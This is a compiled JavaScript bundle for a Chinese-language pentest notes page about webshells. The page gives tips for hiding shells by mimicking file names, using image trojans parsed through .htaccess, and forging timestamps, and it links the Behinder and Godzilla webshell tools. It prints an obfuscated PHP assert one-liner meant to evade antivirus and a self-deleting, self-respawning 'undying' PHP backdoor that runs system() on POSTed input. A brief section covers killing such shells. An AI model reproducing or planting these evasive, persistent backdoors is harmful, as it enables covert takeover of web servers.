(window.webpackJsonp=window.webpackJsonp||[]).push([[54],{788:function(t,s,a){"use strict";a.r(s);var n=a(103),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"webshell"}},[t._v("WebShell "),a("a",{staticClass:"header-anchor",attrs:{href:"#webshell"}},[t._v("#")])]),t._v(" "),a("h2",{attrs:{id:"隐藏webshell"}},[t._v("隐藏WebShell "),a("a",{staticClass:"header-anchor",attrs:{href:"#隐藏webshell"}},[t._v("#")])]),t._v(" "),a("blockquote",[a("p",[t._v("1、仿照已存在的文件起名字，隐藏在深层目录， 创建…目录隐藏shell\n2、利用静态文件，比如图片马然后利用 .htaccess 进行解析\n3、修改WebShell时间戳为同目录下其它文件相同的时间")])]),t._v(" "),a("h2",{attrs:{id:"快速应用"}},[t._v("快速应用 "),a("a",{staticClass:"header-anchor",attrs:{href:"#快速应用"}},[t._v("#")])]),t._v(" "),a("p",[t._v("直接上冰蝎加密shell，或哥斯拉内存马（基于tomcat）\n冰蝎：https://github.com/rebeyond/Behinder\n哥斯拉：https://github.com/BeichenDream/Godzilla")]),t._v(" "),a("h2",{attrs:{id:"php"}},[t._v("PHP "),a("a",{staticClass:"header-anchor",attrs:{href:"#php"}},[t._v("#")])]),t._v(" "),a("p",[a("strong",[t._v("文件免杀")]),t._v("（Apache、Nginx特性）cmd")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("assert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("implode")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("reset")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("get_defined_vars")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//返回由所有已定义变量所组成的数组    ")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("Use")]),t._v(" age：cmd"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("php"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("a"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("system")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("whoami"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n适用于"),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("PHP")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("7.1")]),t._v(" ，因为在"),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("PHP7")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("之后assert被弃用了、"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("7.2")]),t._v(" create_function被弃用了\n")])])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br")])]),a("p",[a("strong",[t._v("内存马")])]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[t._v("//nodie_shell.php\n"),a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("set_time_limit")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//设置脚本最大执行时间,0 即为无时间限制")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("ignore_user_abort")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token boolean constant"}},[t._v("true")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//设置与客户机断开不终止脚本的执行")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("unlink")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("__FILE__")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//删除文件自身")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$file")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'/var/www/html/.shell.php'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\t\n\t"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$code")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v('\'<?php if(md5($_POST["pass"])=="cdd7b7420654eb16c1e1b748d5b7c5b8"){@system($_POST[a]);}?>\'')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("while")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t\t"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("file_put_contents")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$file")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$code")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//写shell文件")]),t._v("\n\t\t"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("system")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'touch -m -d \"2014-10-31 13:50:11\" .shell.php'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//修改时间戳")]),t._v("\n\t\t"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("usleep")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1000")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//以指定的微秒数延缓程序的执行")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br"),a("span",{staticClass:"line-number"},[t._v("11")]),a("br"),a("span",{staticClass:"line-number"},[t._v("12")]),a("br"),a("span",{staticClass:"line-number"},[t._v("13")]),a("br")])]),a("p",[a("strong",[t._v("杀死PHP不死马")])]),t._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("、高权限，重启服务\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("service")]),t._v(" apache2 restart\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("service")]),t._v(" php restart\n\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v("、低权限，杀掉所有进程\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("kill")]),t._v(" -9 -1\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("killall")]),t._v(" apache2\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br")])]),a("h2",{attrs:{id:"其它参考"}},[t._v("其它参考 "),a("a",{staticClass:"header-anchor",attrs:{href:"#其它参考"}},[t._v("#")])]),t._v(" "),a("p",[t._v("Tomcat无文件Shell： https://github.com/z1Ro0/tomcat_nofile_webshell")]),t._v(" "),a("p",[a("a",{attrs:{href:"https://mp.weixin.qq.com/s/s_DcLdhEtIZkC2_z0Zz4FQ",target:"_blank",rel:"noopener noreferrer"}},[t._v("冰蝎，从入门到魔改"),a("OutboundLink")],1)]),t._v(" "),a("p",[a("a",{attrs:{href:"https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&mid=2247484318&idx=1&sn=ece9e52218be0ea84ef166c3bfd20f23&chksm=fcb7811bcbc0080dd2c39f228dcfe069880218b9f354b1283606af680b1eaecdc07a8a43b188&scene=126&sessionid=1596615082&key=4024143df9a90d6cf039e6e552bb5cc12f755fd25a44855e8dfaff85efc30720e50fd9f3299dbb007c78e96c833dc3df98a87f4c4a4e3ccff0084c0ad0325d06a0265851bfa777df7f014bc8d790632f&ascene=1&uin=MTUwNjgwNTkxMA%3D%3D&devicetype=Windows+10+x64&version=62090070&lang=zh_CN&exportkey=AzFdHdxTih44P2kITVRk35s%3D&pass_ticket=lppPNqJhx8ZD573ypwsqgQ41%2F%2BJd%2B2avwvIfBnLfOjeNcQkihuzk3CgS%2F36Je%2Bnb",target:"_blank",rel:"noopener noreferrer"}},[t._v("冰蝎改造之不改动客户端=>内存马"),a("OutboundLink")],1)])])}),[],!1,null,null,null);s.default=e.exports}}]);